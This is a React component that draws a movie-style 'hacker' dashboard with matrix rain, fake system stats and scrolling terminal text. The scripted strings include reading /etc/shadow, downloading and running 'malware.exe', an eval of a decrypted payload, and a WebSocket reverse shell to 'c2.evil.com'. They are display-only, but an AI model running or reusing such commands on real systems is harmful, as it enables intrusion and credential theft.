import React, { useState, useEffect, useRef } from 'react';
import { Terminal, Wifi, Shield, Activity, Zap, Settings } from 'lucide-react';

interface Theme {
  name: string;
  primary: string;
  secondary: string;
  accent: string;
  background: string;
  text: string;
  glow: string;
}

const themes: Theme[] = [
  {
    name: 'Matrix',
    primary: '#00ff41',
    secondary: '#008f11',
    accent: '#00ff41',
    background: '#000000',
    text: '#00ff41',
    glow: '0 0 10px #00ff41, 0 0 20px #00ff41, 0 0 30px #00ff41'
  },
  {
    name: 'Amber',
    primary: '#ffb000',
    secondary: '#cc8800',
    accent: '#ffd700',
    background: '#1a0f00',
    text: '#ffb000',
    glow: '0 0 10px #ffb000, 0 0 20px #ffb000, 0 0 30px #ffb000'
  },
  {
    name: 'Blue',
    primary: '#00aaff',
    secondary: '#0077cc',
    accent: '#00ccff',
    background: '#001122',
    text: '#00aaff',
    glow: '0 0 10px #00aaff, 0 0 20px #00aaff, 0 0 30px #00aaff'
  },
  {
    name: 'Red Alert',
    primary: '#ff3333',
    secondary: '#cc0000',
    accent: '#ff6666',
    background: '#220000',
    text: '#ff3333',
    glow: '0 0 10px #ff3333, 0 0 20px #ff3333, 0 0 30px #ff3333'
  }
];

const HackerScreen: React.FC = () => {
  const [currentTheme, setCurrentTheme] = useState(0);
  const [time, setTime] = useState(new Date());
  const theme = themes[currentTheme];

  useEffect(() => {
    const timer = setInterval(() => setTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  const style = {
    '--theme-primary': theme.primary,
    '--theme-secondary': theme.secondary,
    '--theme-accent': theme.accent,
    '--theme-background': theme.background,
    '--theme-text': theme.text,
    '--theme-glow': theme.glow,
  } as React.CSSProperties;

  return (
    <div 
      className="min-h-screen overflow-hidden relative font-mono"
      style={{
        background: theme.background,
        color: theme.text,
        ...style
      }}
    >
      {/* Matrix Rain Background */}
      <MatrixRain theme={theme} />
      
      {/* Scanlines Effect */}
      <div className="absolute inset-0 pointer-events-none opacity-10">
        <div className="h-full w-full" style={{
          background: `repeating-linear-gradient(
            0deg,
            transparent,
            transparent 2px,
            ${theme.primary} 2px,
            ${theme.primary} 4px
          )`
        }} />
      </div>

      {/* Theme Switcher */}
      <div className="absolute top-4 right-4 z-50">
        <div className="flex items-center gap-2 p-2 rounded border" style={{
          backgroundColor: `${theme.background}aa`,
          borderColor: theme.primary,
          boxShadow: theme.glow
        }}>
          <Settings size={16} />
          <select 
            value={currentTheme} 
            onChange={(e) => setCurrentTheme(Number(e.target.value))}
            className="bg-transparent text-xs outline-none"
            style={{ color: theme.text }}
          >
            {themes.map((t, i) => (
              <option key={i} value={i} style={{ backgroundColor: theme.background }}>
                {t.name}
              </option>
            ))}
          </select>
        </div>
      </div>

      {/* Main Grid Layout */}
      <div className="grid grid-cols-12 grid-rows-8 gap-2 p-4 h-screen">
        {/* Header Status Bar */}
        <div className="col-span-12 row-span-1 flex items-center justify-between p-2 border rounded" style={{
          borderColor: theme.primary,
          backgroundColor: `${theme.background}cc`,
          boxShadow: theme.glow
        }}>
          <div className="flex items-center gap-4">
            <Shield className="animate-pulse" size={20} />
            <span className="text-sm font-bold">NEURAL INTERFACE v2.1.7</span>
            <div className="flex items-center gap-1">
              <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: theme.accent }} />
              <span className="text-xs">CONNECTED</span>
            </div>
          </div>
          <div className="text-sm">
            {time.toLocaleTimeString()} | {time.toLocaleDateString()}
          </div>
        </div>

        {/* Terminal 1 - Main Command */}
        <div className="col-span-5 row-span-4">
          <TerminalWindow title="MAIN_TERMINAL.exe" theme={theme}>
            <CommandSequence theme={theme} />
          </TerminalWindow>
        </div>

        {/* System Monitor */}
        <div className="col-span-3 row-span-4">
          <TerminalWindow title="SYS_MONITOR" theme={theme}>
            <SystemMonitor theme={theme} />
          </TerminalWindow>
        </div>

        {/* Network Activity */}
        <div className="col-span-4 row-span-4">
          <TerminalWindow title="NET_TRACE" theme={theme}>
            <NetworkActivity theme={theme} />
          </TerminalWindow>
        </div>

        {/* Code Stream */}
        <div className="col-span-6 row-span-3">
          <TerminalWindow title="DATA_STREAM" theme={theme}>
            <CodeStream theme={theme} />
          </TerminalWindow>
        </div>

        {/* Progress Monitors */}
        <div className="col-span-6 row-span-3">
          <TerminalWindow title="INTRUSION_DETECT" theme={theme}>
            <ProgressMonitors theme={theme} />
          </TerminalWindow>
        </div>
      </div>
    </div>
  );
};

// Matrix Rain Component
const MatrixRain: React.FC<{ theme: Theme }> = ({ theme }) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars = 'アカサタナハマヤラワンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops: number[] = [];

    for (let i = 0; i < columns; i++) {
      drops[i] = 1;
    }

    const draw = () => {
      ctx.fillStyle = `${theme.background}0a`;
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = theme.primary;
      ctx.font = `${fontSize}px monospace`;

      for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
    };

    const interval = setInterval(draw, 50);
    return () => clearInterval(interval);
  }, [theme]);

  return (
    <canvas
      ref={canvasRef}
      className="absolute inset-0 opacity-20 pointer-events-none"
    />
  );
};

// Terminal Window Component
const TerminalWindow: React.FC<{ 
  title: string; 
  theme: Theme; 
  children: React.ReactNode 
}> = ({ title, theme, children }) => {
  return (
    <div 
      className="h-full border rounded-lg flex flex-col overflow-hidden"
      style={{
        borderColor: theme.primary,
        backgroundColor: `${theme.background}dd`,
        boxShadow: theme.glow
      }}
    >
      <div 
        className="flex items-center justify-between p-2 text-xs font-bold border-b"
        style={{ borderColor: theme.secondary }}
      >
        <div className="flex items-center gap-2">
          <Terminal size={12} />
          <span>{title}</span>
        </div>
        <div className="flex gap-1">
          <div className="w-2 h-2 rounded-full" style={{ backgroundColor: theme.accent }} />
          <div className="w-2 h-2 rounded-full opacity-50" style={{ backgroundColor: theme.primary }} />
          <div className="w-2 h-2 rounded-full opacity-30" style={{ backgroundColor: theme.secondary }} />
        </div>
      </div>
      <div className="flex-1 p-2 overflow-hidden">
        {children}
      </div>
    </div>
  );
};

// Command Sequence Component
const CommandSequence: React.FC<{ theme: Theme }> = ({ theme }) => {
  const [commands, setCommands] = useState<string[]>([]);
  const [cursor, setCursor] = useState(true);

  const commandList = [
    'ssh root@192.168.1.100',
    'Password: ••••••••',
    'Welcome to Ubuntu 20.04.3 LTS',
    'Last login: ' + new Date().toISOString(),
    'root@target:~# ls -la',
    'total 48K',
    'drwx------ 6 root root 4.0K Dec 15 10:42 .',
    'drwxr-xr-x 3 root root 4.0K Nov 28 09:15 ..',
    '-rw------- 1 root root  156 Dec 15 10:42 .bash_history',
    'drwx------ 2 root root 4.0K Dec 10 14:23 .ssh',
    '-rw-r--r-- 1 root root  22K Dec 15 09:30 database.db',
    'root@target:~# cat /etc/shadow',
    'root:$6$salt$hash...:18901:0:99999:7:::',
    'daemon:*:18474:0:99999:7:::',
    'bin:*:18474:0:99999:7:::',
    'root@target:~# netstat -tulpn',
    'Active Internet connections',
    'tcp  0.0.0.0:22    LISTEN   1234/sshd',
    'tcp  0.0.0.0:80    LISTEN   5678/apache2',
    'tcp  0.0.0.0:443   LISTEN   5678/apache2',
    'root@target:~# wget http://malware.exe',
    'Connecting to malware.exe...',
    '100%[==========] 2.3MB  1.2MB/s',
    'root@target:~# chmod +x malware.exe',
    'root@target:~# ./malware.exe &',
    '[1] 9876',
    'root@target:~# ps aux | grep malware',
    'root  9876  0.1  0.2  malware.exe',
    'ACCESS GRANTED - BACKDOOR INSTALLED',
    'root@target:~# █'
  ];

  useEffect(() => {
    let index = 0;
    const interval = setInterval(() => {
      if (index < commandList.length) {
        setCommands(prev => [...prev, commandList[index]]);
        index++;
      } else {
        // Reset and start over
        setCommands([]);
        index = 0;
      }
    }, 800);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const cursorInterval = setInterval(() => {
      setCursor(prev => !prev);
    }, 500);
    return () => clearInterval(cursorInterval);
  }, []);

  return (
    <div className="h-full overflow-hidden text-xs leading-relaxed">
      {commands.map((cmd, i) => (
        <div key={i} className="animate-pulse-once">
          {cmd}
          {i === commands.length - 1 && cursor && (
            <span className="ml-1 animate-pulse" style={{ color: theme.accent }}>█</span>
          )}
        </div>
      ))}
    </div>
  );
};

// System Monitor Component
const SystemMonitor: React.FC<{ theme: Theme }> = ({ theme }) => {
  const [stats, setStats] = useState({
    cpu: 0,
    memory: 0,
    network: 0,
    disk: 0
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setStats({
        cpu: Math.floor(Math.random() * 100),
        memory: Math.floor(Math.random() * 100),
        network: Math.floor(Math.random() * 100),
        disk: Math.floor(Math.random() * 100)
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const ProgressBar: React.FC<{ label: string; value: number }> = ({ label, value }) => (
    <div className="mb-2">
      <div className="flex justify-between text-xs mb-1">
        <span>{label}</span>
        <span>{value}%</span>
      </div>
      <div className="w-full h-2 border rounded" style={{ borderColor: theme.secondary }}>
        <div 
          className="h-full rounded transition-all duration-500"
          style={{ 
            width: `${value}%`,
            backgroundColor: value > 80 ? theme.accent : theme.primary,
            boxShadow: `0 0 5px ${value > 80 ? theme.accent : theme.primary}`
          }}
        />
      </div>
    </div>
  );

  return (
    <div className="text-xs space-y-3">
      <div className="text-center font-bold mb-4">SYSTEM STATUS</div>
      <ProgressBar label="CPU USAGE" value={stats.cpu} />
      <ProgressBar label="MEMORY" value={stats.memory} />
      <ProgressBar label="NETWORK I/O" value={stats.network} />
      <ProgressBar label="DISK USAGE" value={stats.disk} />
      
      <div className="mt-4 space-y-1 text-xs">
        <div>PROCESSES: {Math.floor(Math.random() * 200) + 100}</div>
        <div>CONNECTIONS: {Math.floor(Math.random() * 50) + 10}</div>
        <div>UPTIME: {Math.floor(Math.random() * 48)}h {Math.floor(Math.random() * 60)}m</div>
        <div className="flex items-center gap-1">
          <Activity size={10} className="animate-pulse" />
          <span>STATUS: ACTIVE</span>
        </div>
      </div>
    </div>
  );
};

// Network Activity Component
const NetworkActivity: React.FC<{ theme: Theme }> = ({ theme }) => {
  const [activities, setActivities] = useState<string[]>([]);

  const networkEvents = [
    'TCP 192.168.1.100:22 -> 10.0.0.50:4444 [SYN]',
    'UDP 172.16.0.1:53 -> 8.8.8.8:53 [DNS Query]',
    'HTTP GET /admin/login.php',
    'TCP 10.0.0.1:80 -> 192.168.1.1:3421 [RST]',
    'SSH Connection established from 203.0.113.0',
    'FTP Login attempt: admin/password123',
    'ICMP Echo Request -> 192.168.1.1',
    'TCP Port scan detected on 192.168.1.100',
    'SSL Handshake failed with 10.0.0.20:443',
    'Suspicious traffic from 198.51.100.0/24',
    'Firewall blocked connection to 203.0.113.1',
    'Backdoor communication detected',
    'Data exfiltration in progress...',
    'Intrusion attempt logged',
    'Network anomaly detected'
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      const newEvent = networkEvents[Math.floor(Math.random() * networkEvents.length)];
      setActivities(prev => {
        const updated = [newEvent, ...prev];
        return updated.slice(0, 15); // Keep only last 15 entries
      });
    }, 600);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="h-full overflow-hidden">
      <div className="text-center font-bold mb-2 text-xs">NETWORK TRACE</div>
      <div className="space-y-1 text-xs">
        {activities.map((activity, i) => (
          <div 
            key={i} 
            className="animate-fade-in opacity-90"
            style={{ 
              color: i === 0 ? theme.accent : theme.text,
              textShadow: i === 0 ? `0 0 5px ${theme.accent}` : 'none'
            }}
          >
            [{new Date().toLocaleTimeString()}] {activity}
          </div>
        ))}
      </div>
    </div>
  );
};

// Code Stream Component
const CodeStream: React.FC<{ theme: Theme }> = ({ theme }) => {
  const [code, setCode] = useState<string[]>([]);

  const codeLines = [
    'function decrypt(data) {',
    '  const key = 0x41414141;',
    '  let result = "";',
    '  for(let i = 0; i < data.length; i++) {',
    '    result += String.fromCharCode(',
    '      data.charCodeAt(i) ^ key',
    '    );',
    '  }',
    '  return result;',
    '}',
    '',
    'const payload = decrypt(encrypted_data);',
    'eval(payload);',
    '',
    '// Establishing reverse shell...',
    'const socket = new WebSocket("ws://c2.evil.com");',
    'socket.onopen = () => {',
    '  console.log("Connection established");',
    '  executeCommands();',
    '};',
    '',
    'function executeCommands() {',
    '  const commands = [',
    '    "whoami",',
    '    "uname -a",',
    '    "cat /etc/passwd",',
    '    "find / -name \"*.db\" 2>/dev/null"',
    '  ];',
    '  // ... exploitation code continues',
    '}'
  ];

  useEffect(() => {
    let index = 0;
    const interval = setInterval(() => {
      if (index < codeLines.length) {
        setCode(prev => [...prev, codeLines[index]]);
        index++;
      } else {
        setCode([]);
        index = 0;
      }
    }, 200);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="h-full overflow-hidden text-xs font-mono">
      <div className="text-center font-bold mb-2">PAYLOAD ANALYSIS</div>
      {code.map((line, i) => (
        <div key={i} className="animate-fade-in leading-4" style={{
          color: line && line.includes('//') ? theme.secondary : 
                line && (line.includes('function') || line.includes('const') || line.includes('let')) ? theme.accent :
                theme.text
        }}>
          {line}
        </div>
      ))}
    </div>
  );
};

// Progress Monitors Component
const ProgressMonitors: React.FC<{ theme: Theme }> = ({ theme }) => {
  const [progress, setProgress] = useState({
    decryption: 0,
    download: 0,
    analysis: 0,
    infiltration: 0
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setProgress(prev => ({
        decryption: Math.min(100, prev.decryption + Math.random() * 5),
        download: Math.min(100, prev.download + Math.random() * 3),
        analysis: Math.min(100, prev.analysis + Math.random() * 4),
        infiltration: Math.min(100, prev.infiltration + Math.random() * 2)
      }));
    }, 300);

    return () => clearInterval(interval);
  }, []);

  const ProgressItem: React.FC<{ label: string; value: number; status: string }> = ({ label, value, status }) => (
    <div className="mb-3">
      <div className="flex justify-between text-xs mb-1">
        <span>{label}</span>
        <span>{Math.floor(value)}%</span>
      </div>
      <div className="w-full h-2 border rounded mb-1" style={{ borderColor: theme.secondary }}>
        <div 
          className="h-full rounded transition-all duration-300"
          style={{ 
            width: `${value}%`,
            backgroundColor: value === 100 ? theme.accent : theme.primary,
            boxShadow: `0 0 5px ${value === 100 ? theme.accent : theme.primary}`
          }}
        />
      </div>
      <div className="text-xs opacity-80">{status}</div>
    </div>
  );

  return (
    <div className="text-xs">
      <div className="text-center font-bold mb-4">OPERATION STATUS</div>
      <ProgressItem 
        label="DECRYPTION" 
        value={progress.decryption}
        status={progress.decryption === 100 ? "COMPLETE" : "PROCESSING..."}
      />
      <ProgressItem 
        label="DATA DOWNLOAD" 
        value={progress.download}
        status={progress.download === 100 ? "COMPLETE" : "DOWNLOADING..."}
      />
      <ProgressItem 
        label="THREAT ANALYSIS" 
        value={progress.analysis}
        status={progress.analysis === 100 ? "COMPLETE" : "ANALYZING..."}
      />
      <ProgressItem 
        label="SYSTEM INFILTRATION" 
        value={progress.infiltration}
        status={progress.infiltration === 100 ? "ACCESS GRANTED" : "PENETRATING..."}
      />
    </div>
  );
};

export default HackerScreen;